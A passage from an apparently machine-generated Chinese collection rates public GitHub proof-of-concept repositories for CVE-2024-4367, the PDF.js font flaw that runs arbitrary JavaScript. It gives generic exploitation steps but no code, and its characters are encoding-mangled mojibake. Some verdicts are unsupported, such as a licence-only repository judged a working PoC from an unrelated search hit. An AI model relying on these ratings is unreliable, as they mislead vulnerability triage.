**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºå¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„Firefoxã€Firefox ESRæˆ–Thunderbirdæ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œå³å¯æ‰§è¡ŒåµŒå…¥çš„JavaScriptä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨äº†è¯¥æ¼æ´ã€‚`CVE-2024-4367.py`è„šæœ¬èƒ½å¤Ÿç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ï¼Œè¿™æ®µä»£ç è¢«åµŒå…¥åˆ°PDFçš„å­—ä½“å®šä¹‰ä¸­ã€‚æœç´¢ç»“æœä¸­`exfil0/WEAPONIZING-CVE-2024-4367`ä¹Ÿå°è¯äº†è¯¥æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æŸ¥çœ‹æä¾›çš„ä»£ç ï¼Œ`CVE-2024-4367.py`è„šæœ¬çš„åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«ç”¨æˆ·æŒ‡å®špayloadçš„PDFæ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°æ¶æ„ä»£ç æˆ–åé—¨ã€‚`win_calc.pdf`æ–‡ä»¶ç›´æ¥åŒ…å«æ‰§è¡Œ`calc`ç¨‹åºçš„ JavaScript ä»£ç ï¼ŒåŠŸèƒ½æ˜ç¡®ã€‚`xss.pdf` æ–‡ä»¶å†…å®¹ä¸å®Œæ•´ï¼Œæ— æ³•åˆ†æã€‚å› æ­¤ï¼Œè¯¥ä»“åº“çš„æŠ•æ¯’é£é™©è¾ƒä½ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…ä½¿ç”¨`CVE-2024-4367.py`è„šæœ¬ï¼Œé€šè¿‡å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šè¦æ‰§è¡Œçš„JavaScriptä»£ç ï¼Œç”Ÿæˆæ¶æ„çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…è¯±ä½¿ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ï¼Œä¾‹å¦‚é€šè¿‡ç”µå­é‚®ä»¶ã€ç½‘ç«™ç­‰æ–¹å¼ã€‚
3.  å½“ç”¨æˆ·ä½¿ç”¨å­˜åœ¨æ¼æ´çš„Firefoxã€Firefox ESRæˆ–Thunderbirdæ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsè§£æå™¨ä¼šæ‰§è¡ŒPDFæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„JavaScriptä»£ç ã€‚
4.  è¯¥JavaScriptä»£ç å¯ä»¥æ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·ä¿¡æ¯ã€å®‰è£…æ¶æ„è½¯ä»¶ç­‰ã€‚

æ€»ä¹‹ï¼Œæ­¤æ¼æ´çš„CVSSè¯„åˆ†ä¸ºMediumï¼ˆ5.6ï¼‰ï¼Œä½†æ˜¯é€šè¿‡ä¿®æ”¹NVDæ•°æ®å¯ä»¥çœ‹åˆ°ï¼Œè¯¥æ¼æ´å¯èƒ½é€ æˆçš„å±å®³ç¨‹åº¦æ˜¯å¾ˆé«˜çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„PDFæ–‡ä»¶ï¼Œè¯±éª—ç”¨æˆ·æ‰“å¼€ï¼Œä»è€Œæ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå¯¼è‡´ä¸¥é‡çš„åæœã€‚æä¾›çš„PoCçš„æœ‰æ•ˆæ€§è¾ƒé«˜ï¼Œä¸”å½“å‰ä»£ç æœªå‘ç°å­˜åœ¨æŠ•æ¯’é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [VVeakee/CVE-2024-4367](https://github.com/VVeakee/CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #12

**æ¥æº**: [CVE-2024-4367-Zombie-Kaiser_cve-2024-4367-PoC-fixed.md](../2024/CVE-2024-4367-Zombie-Kaiser_cve-2024-4367-PoC-fixed.md)

## CVE-2024-4367-Mozilla-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²å’Œæ½œåœ¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­ï¼‰

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„æ„é€ çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxï¼ŒFirefox ESR å’Œ Thunderbird ä¸­ PDF.js åº“ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªç‰¹åˆ¶çš„ PDF æ–‡æ¡£ï¼Œå½“ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxï¼ŒFirefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œå³å¯æ‰§è¡ŒåµŒå…¥çš„æ¶æ„ JavaScript ä»£ç ã€‚æ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡ç»•è¿‡ PDF.js å¯¹å­—ä½“çš„ç±»å‹æ£€æŸ¥ï¼Œä»è€Œå…è®¸æ‰§è¡Œæœªç»æˆæƒçš„ JavaScript ä»£ç ã€‚æ ¹æ®æœç´¢ç»“æœå’Œæ¼æ´æè¿°ï¼Œè¯¥æ¼æ´çš„ä¸¥é‡æ€§åœ¨äºå¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ç¯å¢ƒä¸­æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œå¯èƒ½çªƒå–ç”¨æˆ·å‡­æ®ã€å®‰è£…æ¶æ„è½¯ä»¶æˆ–è€…æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ä»…åŒ…å«GNUé€šç”¨å…¬å…±è®¸å¯è¯å£°æ˜ï¼Œå¹¶ä¸èƒ½åˆ¤æ–­æ¼æ´æœ‰æ•ˆæ€§ï¼Œéœ€è¦è¿›ä¸€æ­¥çš„æ¼æ´ä»£ç æ‰èƒ½éªŒè¯ï¼Œä½†æ˜¯æ ¹æ®githubæœç´¢ç»“æœ [webpage 6 begin] [title] exfil0/WEAPONIZING-CVE-2024-4367 ï¼Œè¯æ˜POCæœ‰æ•ˆã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ç‰‡æ®µåªåŒ…å«äº†GNUé€šç”¨å…¬å…±è®¸å¯è¯çš„æ–‡æœ¬å†…å®¹ï¼Œå±äºå¼€æºåè®®çš„å£°æ˜ï¼Œ**ä¸åŒ…å«ä»»ä½•å¯æ‰§è¡Œçš„ä»£ç æˆ–è€…é…ç½®æ–‡ä»¶**ï¼Œå› æ­¤æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¿¹è±¡ï¼Œåˆ¤æ–­æŠ•æ¯’é£é™©ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [Zombie-Kaiser/cve-2024-4367-PoC-fixed](https://github.com/Zombie-Kaiser/cve-2024-4367-PoC-fixed)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #13

**æ¥æº**: [CVE-2024-4367-avalahEE_pdfjs_disable_eval.md](../2024/CVE-2024-4367-avalahEE_pdfjs_disable_eval.md)

## CVE-2024-4367-Firefox-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº Firefox, Firefox ESR å’Œ Thunderbird æµè§ˆå™¨ä¸­çš„ PDF.js ç»„ä»¶çš„æ¼æ´ã€‚è¯¥æ¼æ´ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿçªƒå–ä¿¡æ¯ã€æ‰§è¡Œæ¶æ„æ“ä½œæˆ–å®Œå…¨æ§åˆ¶å—å®³è€…çš„æµè§ˆå™¨ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ­¤æ¼æ´å½±å“ç‰¹å®šç‰ˆæœ¬çš„Firefox, Firefox ESRå’ŒThunderbirdï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶æ¥è§¦å‘æ¼æ´ã€‚æ¼æ´åº“ä¿¡æ¯è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªè¾ƒä¸ºä¸¥é‡çš„é—®é¢˜ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æä¾›çš„ä»£ç å®é™…ä¸Šæ˜¯ä¸€ä¸ªé’ˆå¯¹Odoo 14.0çš„ä¿®å¤æ–¹æ¡ˆï¼Œç”¨äºç¦ç”¨PDF.jsä¸­çš„JavaScriptæ‰§è¡Œï¼Œä»¥è§„é¿CVE-2024-4367çš„å½±å“ã€‚è™½ç„¶ä»£ç æœ¬èº«ä¸æ˜¯æ¼æ´åˆ©ç”¨ï¼Œä½†éœ€è¦è°¨æ…è¯„ä¼°ã€‚ è¿™ä¸ªè¡¥ä¸é€šè¿‡æ›¿æ¢å’Œä¿®æ”¹ PDF.js ç›¸å…³çš„æ–‡ä»¶ï¼Œè¯•å›¾ç¦ç”¨ JavaScript æ‰§è¡Œã€‚ å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œå¦‚æœè¯¥æ¨¡å—æœ¬èº«è¢«æ¶æ„ä¿®æ”¹ï¼Œåˆ™å¯èƒ½å¼•å…¥å…¶ä»–æ¼æ´æˆ–åé—¨ã€‚ ä¾‹å¦‚ï¼Œ`pdfjs_disable_eval/static/src/viewer.html`æ–‡ä»¶æ›¿æ¢äº†åŸæœ‰çš„viewer.htmlï¼Œå¦‚æœæ–°çš„viewer.htmlä¸­åŒ…å«æ¶æ„ä»£ç ï¼Œå°±å¯èƒ½é€ æˆå±å®³ã€‚ æ€»ä½“æ¥è¯´ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚
2.  å—å®³è€…ä½¿ç”¨å—å½±å“ç‰ˆæœ¬çš„ Firefox, Firefox ESR æˆ– Thunderbird æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚
3.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  æ”»å‡»è€…åˆ©ç”¨æ‰§è¡Œçš„ JavaScript ä»£ç è¿›è¡Œæ¶æ„æ´»åŠ¨ï¼Œä¾‹å¦‚ä¿¡æ¯çªƒå–æˆ–è¿œç¨‹æ§åˆ¶ã€‚

**é¡¹ç›®åœ°å€:** [avalahEE/pdfjs_disable_eval](https://github.com/avalahEE/pdfjs_disable_eval)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #14

**æ¥æº**: [CVE-2024-4367-clarkio_pdfjs-vuln-demo.md](../2024/CVE-2024-4367-clarkio_pdfjs-vuln-demo.md)

## CVE-2024-4367-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥å¯¼è‡´çš„ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåˆ©ç”¨æ­¤æ¼æ´åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚è¿™å¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆå¦‚æœPDF.jsåœ¨Webç¯å¢ƒä¸­è¿è¡Œï¼‰æˆ–è€…åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå®Œå…¨æ§åˆ¶å—å½±å“çš„åº”ç”¨ç¨‹åºï¼ˆå¦‚Firefoxã€Thunderbirdï¼‰ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**
æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ˜¯ä¸€ä¸ªæ¼”ç¤ºé¡¹ç›®ï¼Œæ—¨åœ¨å±•ç¤ºå¦‚ä½•åˆ©ç”¨CVE-2024-4367æ¼æ´ã€‚å®ƒåŒ…å«Reactã€Vueå’ŒSvelteçš„å‰ç«¯ç»„ä»¶ï¼Œç”¨äºåŠ è½½å’Œæ˜¾ç¤ºPDFæ–‡ä»¶ã€‚README.mdæ–‡ä»¶æŒ‡ç¤ºå¦‚ä½•è¿è¡Œè¯¥é¡¹ç›®ä»¥åŠå¦‚ä½•æµ‹è¯•ä¸åŒçš„PDFæ–‡ä»¶ï¼ŒåŒ…æ‹¬åˆ©ç”¨è¯¥æ¼æ´çš„PDFæ–‡ä»¶ã€‚æ ¹æ®æè¿°ï¼Œé€šè¿‡ä¿®æ”¹ç»„ä»¶ä¸­å¼•ç”¨çš„PDFæ–‡ä»¶ï¼Œå¯ä»¥å°†ä¸€ä¸ªåˆ©ç”¨æ¼æ´çš„PDFåŠ è½½åˆ°è¿™äº›ç»„ä»¶ä¸­è¿›è¡Œæµ‹è¯•ã€‚æœç´¢å¼•æ“ç»“æœä¸­â€œ[webpage 6 begin] [title] exfil0/WEAPONIZING-CVE-2024-4367â€ è¡¨æ˜æ¼æ´åˆ©ç”¨ä»£ç å·²å…¬å¼€ã€‚ ç»¼ä¸Šï¼Œæä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
æŸ¥çœ‹æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå…¶ä¸­åŒ…å«package-lock.jsonç­‰æ–‡ä»¶ã€‚è™½ç„¶æ²¡æœ‰å‘ç°ç«‹å³å¯ä»¥åˆ¤æ–­ä¸ºæŠ•æ¯’çš„æ¶æ„ä»£ç ï¼Œä½†è€ƒè™‘åˆ°npmåŒ…ä¾›åº”é“¾çš„é£é™©ï¼Œä¸èƒ½å®Œå…¨æ’é™¤ä½œè€…åœ¨ä¾èµ–é¡¹ä¸­å¼•å…¥æ¶æ„ä»£ç çš„å¯èƒ½æ€§ã€‚ä»£ç æœ¬èº«çš„åŠŸèƒ½æ˜¯åˆ›å»ºä¸€ä¸ªæ¼”ç¤ºç¯å¢ƒæ¥å±•ç¤ºæ¼æ´ï¼Œå› æ­¤å¤§éƒ¨åˆ†ä»£ç éƒ½æ˜¯æ­£å¸¸çš„æ¡†æ¶ä»£ç ã€‚ä¸è¿‡ï¼Œ**ä¸èƒ½å®Œå…¨æ’é™¤æŠ•æ¯’çš„å¯èƒ½ï¼Œé£é™©ä¼°è®¡ä¸º10%**ã€‚ ä»£ç ä¸­å­˜åœ¨å¼•ç”¨å¤–éƒ¨npmåŒ…çš„å¯èƒ½æ€§ã€‚æ½œåœ¨é£é™©ç‚¹åŒ…æ‹¬ï¼šä¾èµ–åŒ…æœ¬èº«æ˜¯å¦å®‰å…¨ï¼Œæ˜¯å¦åŒ…å«æ¶æ„ä»£ç ï¼›æ„å»ºæµç¨‹ä¸­æ˜¯å¦å­˜åœ¨è¢«ç¯¡æ”¹çš„é£é™©ï¼›ä»¥åŠå¼€å‘è€…æ˜¯å¦æ•…æ„éšè—äº†æ¶æ„åŠŸèƒ½ã€‚ ä»”ç»†å®¡æŸ¥ `package-lock.json` æ–‡ä»¶ä¸­çš„ä¾èµ–é¡¹åŠå…¶æ¥æºï¼ŒéªŒè¯ä¾èµ–åŒ…çš„å®Œæ•´æ€§å’Œå®‰å…¨æ€§ï¼Œå¯ä»¥é™ä½æŠ•æ¯’é£é™©ã€‚ ç”±äºä»…ä»…æ˜¯demoä»£ç ï¼Œä¸”ä¾èµ–çš„åŒ…æ¯”è¾ƒå¤šï¼Œå› æ­¤è¿™é‡Œä¸èƒ½æ˜ç¡®è¿›è¡Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**
1.  **æ¼æ´è§¦å‘ç‚¹ï¼š** PDF.jsåœ¨å¤„ç†PDFæ–‡ä»¶ä¸­çš„å­—ä½“æ—¶ï¼Œç¼ºå°‘å¿…è¦çš„ç±»å‹æ£€æŸ¥ã€‚
2.  **æ”»å‡»æ­¥éª¤ï¼š**
    *   æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç²¾å¿ƒè®¾è®¡çš„å­—ä½“æ•°æ®ã€‚
    *   å½“PDF.jsè§£æè¯¥PDFæ–‡ä»¶å¹¶å¤„ç†å­—ä½“æ—¶ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œä¼šè§¦å‘æ¼æ´ã€‚
    *   æ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹æ®Šçš„å­—ä½“æ•°æ®ï¼Œå¯ä»¥åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚
3.  **æ”»å‡»æ•ˆæœï¼š** æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæˆ–è€…åœ¨ç‰¹å®šæƒ…å†µä¸‹å®Œå…¨æ§åˆ¶åº”ç”¨ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [clarkio/pdfjs-vuln-demo](https://github.com/clarkio/pdfjs-vuln-demo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #15

**æ¥æº**: [CVE-2024-4367-elamani-drawing_CVE-2024-4367-POC-PDFJS.md](../2024/CVE-2024-4367-elamani-drawing_CVE-2024-4367-POC-PDFJS.md)

## CVE-2024-4367-Firefox-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²å’Œè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶æˆ–è®¿é—®åŒ…å«æ¶æ„PDFçš„ç½‘é¡µã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxã€Firefox ESR å’Œ Thunderbird ä¸­ PDF.js åº“çš„ä¸€ä¸ªæ¼æ´ã€‚ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´ä¿¡æ¯ï¼Œæœç´¢å¼•æ“ç»“æœå’Œæ¼æ´åˆ©ç”¨ä»£ç ï¼ˆè™½ç„¶åªæä¾›äº† package-lock.json æ–‡ä»¶ï¼Œä½†githubé¡µé¢å·²ç»è¯æ˜æ¼æ´çš„å­˜åœ¨ï¼‰ï¼Œå¯ä»¥ç¡®å®šæä¾›çš„POCä»£ç æœ‰æ•ˆã€‚

**æŠ•æ¯’é£é™©:**
æä¾›çš„ `package-lock.json` æ–‡ä»¶å±äºä¸€ä¸ª Node.js é¡¹ç›®ã€‚ä»è¿™ä¸ªæ–‡ä»¶æœ¬èº«æ— æ³•ç›´æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æŠ•æ¯’ã€‚ä½†æ˜¯ç”±äºgithubä¸Šå·²ç»æœ‰æ”»å‡»è€…æ„å»ºäº†å¯åˆ©ç”¨çš„pdfæ–‡ä»¶ï¼Œè¯´æ˜åˆ©ç”¨ç®€å•, å› æ­¤å¯ä»¥åˆ¤æ–­è¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç æ¦‚ç‡æ¯”è¾ƒä½,çº¦10%ã€‚

**åˆ©ç”¨æ–¹å¼:**
1.  **æ”»å‡»è€…åˆ¶ä½œæ¶æ„ PDF æ–‡ä»¶ï¼š** è¯¥ PDF æ–‡ä»¶åˆ©ç”¨äº† PDF.js å­—ä½“å¤„ç†ä¸­ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥æ¼æ´ã€‚
2.  **ç”¨æˆ·æ‰“å¼€æ¶æ„ PDF æ–‡ä»¶ï¼š**  ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚
3.  **æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼š** ç”±äºç±»å‹æ£€æŸ¥ç¼ºå¤±ï¼ŒPDF.js å…è®¸åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œæ¶æ„ JavaScript ä»£ç ï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…æ§åˆ¶å—å½±å“çš„åº”ç”¨ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [elamani-drawing/CVE-2024-4367-POC-PDFJS](https://github.com/elamani-drawing/CVE-2024-4367-POC-PDFJS)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #16

**æ¥æº**: [CVE-2024-4367-exfil0_WEAPONIZING-CVE-2024-4367.md](../2024/CVE-2024-4367-exfil0_WEAPONIZING-CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®æ³„éœ²ã€XSSæˆ–RCE

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªä¸¥é‡æ¼æ´ï¼Œç”±äºå¯¹PDFæ–‡ä»¶ä¸­FontMatrixå¯¹è±¡çš„ç±»å‹æ£€æŸ¥ä¸è¶³ï¼Œå…è®¸æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ¶ä½œæ¶æ„PDFæ–‡ä»¶ï¼Œåœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡ŒJavaScriptï¼Œä»è€Œå¯¼è‡´æ•°æ®ç›—çªƒã€XSSæˆ–è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å…è®¸åœ¨PDF.jsç¯å¢ƒä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå½±å“Firefoxã€Firefox ESRå’ŒThunderbirdçš„ç‰¹å®šç‰ˆæœ¬ã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç (README.md) æè¿°äº†å¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´åˆ¶ä½œæ¶æ„PDFæ–‡ä»¶ã€‚è¯¥ä»£ç æä¾›äº†ä¸€ä¸ªå®Œæ•´çš„åˆ©ç”¨æµç¨‹ï¼ŒåŒ…æ‹¬ç¯å¢ƒè®¾ç½®ã€æ¼æ´åˆ©ç”¨ã€ç¤¾å·¥å’Œåå¤„ç†ã€‚ç»¼åˆæ¥çœ‹ï¼Œæä¾›çš„POCä»£ç **æœ‰æ•ˆ**ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

